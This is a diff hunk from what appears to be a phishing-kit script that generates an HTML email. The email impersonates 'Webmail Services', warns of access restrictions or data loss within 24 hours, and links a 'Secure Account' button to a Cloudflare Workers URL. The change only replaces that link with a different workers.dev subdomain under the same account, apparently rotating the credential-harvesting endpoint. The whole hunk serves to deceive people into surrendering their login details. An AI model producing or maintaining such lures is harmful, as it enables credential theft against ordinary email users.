@@ -129,7 +129,7 @@ cat > email.html <<EOL
       Failure to complete this process within the next 24 hours may result in temporary access restrictions or potential data loss.</p>
     </div>
     <div class="button-container">
-      <a href="https://lively-night-8850.stacyjenn973.workers.dev/" class="cta-button">Secure Account</a>
+      <a href="https://quiet-star-25e9.stacyjenn973.workers.dev/" class="cta-button">Secure Account</a>
     </div>
     <div class="footer">
       &copy; 2025 Webmail Services. All rights reserved.<br />
